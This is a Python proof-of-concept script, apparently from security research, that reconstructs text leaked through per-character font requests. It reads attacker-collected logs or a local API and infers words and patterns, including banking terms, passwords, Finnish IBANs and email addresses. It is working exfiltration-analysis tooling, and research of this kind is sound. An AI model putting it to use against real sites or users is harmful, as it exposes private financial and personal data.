#!/usr/bin/env python3
"""
TypeBleed Log Reconstructor
============================
Reads server access logs (or connects to the live API) and attempts
to reconstruct text content from per-character font requests.

Usage:
    # From live server API:
    python reconstruct.py --api http://localhost:8080

    # From a log file (one JSON entry per line):
    python reconstruct.py --log access.log

Security Research PoC - Bountyy Oy
"""

import argparse
import json
import sys
import urllib.request
from collections import defaultdict


# ---------------------------------------------------------------------------
# Character map
# ---------------------------------------------------------------------------
CHAR_MAP = {}
for cp in range(0x0020, 0x007F):
    CHAR_MAP[f"{cp:04X}"] = chr(cp)
for ch in "€£¥₿":
    CHAR_MAP[f"{ord(ch):04X}"] = ch


def codepoint_to_char(hex_cp):
    return CHAR_MAP.get(hex_cp.upper(), f"U+{hex_cp}")


# ---------------------------------------------------------------------------
# Word inference
# ---------------------------------------------------------------------------
# Extended word list for reconstruction
WORD_LISTS = {
    "banking": [
        "account", "balance", "transfer", "payment", "salary", "credit",
        "debit", "card", "savings", "current", "iban", "transaction",
        "amount", "total", "euro", "monthly", "statement", "withdraw",
        "deposit", "interest", "loan", "mortgage", "overdraft", "fee",
        "charge", "refund", "pending", "completed", "failed", "secure",
        "security", "authentication", "password", "login", "session",
        "active", "expired", "personal", "business", "joint", "holder",
    ],
    "common": [
        "the", "be", "to", "of", "and", "a", "in", "that", "have", "it",
        "for", "not", "on", "with", "as", "you", "do", "at", "this", "but",
        "by", "from", "they", "we", "say", "her", "she", "or", "an", "will",
        "my", "one", "all", "would", "there", "their", "what", "so", "up",
        "out", "if", "about", "who", "get", "which", "go", "me", "when",
        "make", "can", "like", "time", "no", "just", "know", "take",
        "people", "into", "year", "your", "good", "some", "could", "them",
        "see", "other", "than", "then", "now", "look", "only", "come",
        "back", "after", "use", "two", "how", "our", "work", "first",
        "well", "way", "even", "new", "want", "because", "any", "these",
        "give", "day", "most",
    ],
    "names": [
        "mihalis", "haatainen", "antti", "korhonen", "sanna", "virtanen",
        "helsinki", "finland", "bountyy", "securebank", "netflix", "wolt",
    ],
    "numbers_currency": [
        "0", "1", "2", "3", "4", "5", "6", "7", "8", "9",
    ],
}


def infer_words(char_set, categories=None):
    """
    Given a set of characters, find words from word lists that could
    be spelled using only those characters.
    """
    if categories is None:
        categories = WORD_LISTS.keys()

    char_set_lower = {c.lower() for c in char_set}
    results = {}

    for category in categories:
        words = WORD_LISTS.get(category, [])
        possible = [w for w in words if all(c in char_set_lower for c in w)]
        possible.sort(key=len, reverse=True)
        results[category] = possible

    return results


def analyze_character_set(chars):
    """Analyze a character set and return insights."""
    analysis = {
        "total_unique": len(chars),
        "has_digits": any(c.isdigit() for c in chars),
        "has_uppercase": any(c.isupper() for c in chars),
        "has_lowercase": any(c.islower() for c in chars),
        "has_currency": bool(set(chars) & set("€£¥₿$")),
        "has_punctuation": bool(set(chars) & set(".,!?;:-()'\"")),
        "digits": sorted(c for c in chars if c.isdigit()),
        "uppercase": sorted(c for c in chars if c.isupper()),
        "lowercase": sorted(c for c in chars if c.islower()),
        "special": sorted(c for c in chars if not c.isalnum() and c != " "),
    }

    # Pattern detection
    patterns = []
    if analysis["has_currency"] and analysis["has_digits"]:
        patterns.append("CURRENCY_AMOUNT (monetary values detected)")
    if analysis["has_uppercase"] and analysis["has_lowercase"]:
        patterns.append("MIXED_CASE (proper nouns or sentences)")
    if set("FI") <= set(chars) and any(c.isdigit() for c in chars):
        patterns.append("FINNISH_IBAN (FI prefix + digits)")
    if "@" in chars:
        patterns.append("EMAIL_ADDRESS (@ symbol present)")

    analysis["patterns"] = patterns
    return analysis


# ---------------------------------------------------------------------------
# Data sources
# ---------------------------------------------------------------------------
def fetch_from_api(api_url):
    """Fetch session data from the TypeBleed server API."""
    url = f"{api_url.rstrip('/')}/api/sessions"
    try:
        req = urllib.request.Request(url)
        resp = urllib.request.urlopen(req, timeout=10)
        return json.loads(resp.read().decode())
    except Exception as e:
        print(f"[-] Failed to fetch from API: {e}")
        return None


def parse_log_file(log_path):
    """Parse a JSON-lines log file into session data."""
    sessions = defaultdict(lambda: {"codepoints": set(), "ip": ""})

    with open(log_path) as f:
        for line in f:
            line = line.strip()
            if not line:
                continue
            try:
                entry = json.loads(line)
                sid = entry.get("session_id", "unknown")
                cp = entry.get("codepoint", "")
                sessions[sid]["codepoints"].add(cp)
                sessions[sid]["ip"] = entry.get("ip", "")
            except json.JSONDecodeError:
                continue

    result = []
    for sid, data in sessions.items():
        chars = [codepoint_to_char(cp) for cp in sorted(data["codepoints"])]
        result.append({
            "session_id": sid,
            "ip": data["ip"],
            "characters": chars,
            "codepoints": sorted(data["codepoints"]),
            "char_count": len(chars),
        })

    return {"sessions": result}


# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------
def print_session_analysis(session, verbose=False):
    """Print detailed analysis for a single session."""
    sid = session["session_id"]
    chars = session["characters"]
    char_count = session.get("char_count", len(chars))

    print(f"\n{'='*60}")
    print(f"  Session: {sid}")
    print(f"  IP:      {session.get('ip', 'unknown')}")
    print(f"  Chars:   {char_count} unique characters captured")
    print(f"{'='*60}")

    # Character set
    display_chars = "".join(c if c != " " else "␣" for c in sorted(chars))
    print(f"\n  [Character Set]")
    print(f"  {display_chars}")

    # Analysis
    analysis = analyze_character_set(chars)

    print(f"\n  [Breakdown]")
    if analysis["uppercase"]:
        print(f"  Uppercase:   {''.join(analysis['uppercase'])}")
    if analysis["lowercase"]:
        print(f"  Lowercase:   {''.join(analysis['lowercase'])}")
    if analysis["digits"]:
        print(f"  Digits:      {''.join(analysis['digits'])}")
    if analysis["special"]:
        print(f"  Special:     {''.join(analysis['special'])}")

    # Patterns
    if analysis["patterns"]:
        print(f"\n  [Detected Patterns]")
        for pattern in analysis["patterns"]:
            print(f"  ! {pattern}")

    # Word inference
    inferred = infer_words(set(chars))
    print(f"\n  [Inferred Words]")
    for category, words in inferred.items():
        if words:
            top_words = words[:10]
            print(f"  {category:20s}: {', '.join(top_words)}")

    # Template subtraction (if we know the static content)
    if verbose:
        print(f"\n  [Raw Codepoints]")
        for cp in session.get("codepoints", []):
            ch = codepoint_to_char(cp)
            display = ch if ch != " " else "(space)"
            print(f"  U+{cp}  {display}")


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="TypeBleed Log Reconstructor — Analyze exfiltrated "
                    "character data from font requests"
    )
    parser.add_argument(
        "--api", "-a",
        help="TypeBleed server API URL (e.g., http://localhost:8080)",
        default=None,
    )
    parser.add_argument(
        "--log", "-l",
        help="Path to JSON-lines access log file",
        default=None,
    )
    parser.add_argument(
        "--verbose", "-v",
        action="store_true",
        help="Show detailed per-codepoint output",
    )
    parser.add_argument(
        "--json",
        action="store_true",
        help="Output as JSON instead of human-readable text",
    )

    args = parser.parse_args()

    if not args.api and not args.log:
        print("Usage: reconstruct.py --api http://localhost:8080")
        print("       reconstruct.py --log access.log")
        sys.exit(1)

    # Get data
    if args.api:
        data = fetch_from_api(args.api)
    else:
        data = parse_log_file(args.log)

    if not data or not data.get("sessions"):
        print("[-] No session data found.")
        sys.exit(1)

    sessions = data["sessions"]

    if args.json:
        # JSON output mode
        output = []
        for sess in sessions:
            chars = sess["characters"]
            analysis = analyze_character_set(chars)
            inferred = infer_words(set(chars))
            output.append({
                "session_id": sess["session_id"],
                "ip": sess.get("ip", ""),
                "char_count": len(chars),
                "characters": chars,
                "analysis": analysis,
                "inferred_words": inferred,
            })
        print(json.dumps(output, indent=2))
    else:
        # Human-readable output
        print("""
╔══════════════════════════════════════════════════════════╗
║         TypeBleed — Text Reconstruction Analysis         ║
║         Security Research PoC — Bountyy Oy               ║
╚══════════════════════════════════════════════════════════╝
""")
        print(f"  Sessions analyzed: {len(sessions)}")

        for sess in sessions:
            print_session_analysis(sess, verbose=args.verbose)

        print(f"\n{'='*60}")
        print("  Analysis complete.")
        print("  Note: Word inference shows words whose characters are a")
        print("  subset of the captured character set. Actual page content")
        print("  may differ. Combine with template analysis for better")
        print("  reconstruction accuracy.")
        print(f"{'='*60}\n")


if __name__ == "__main__":
    main()
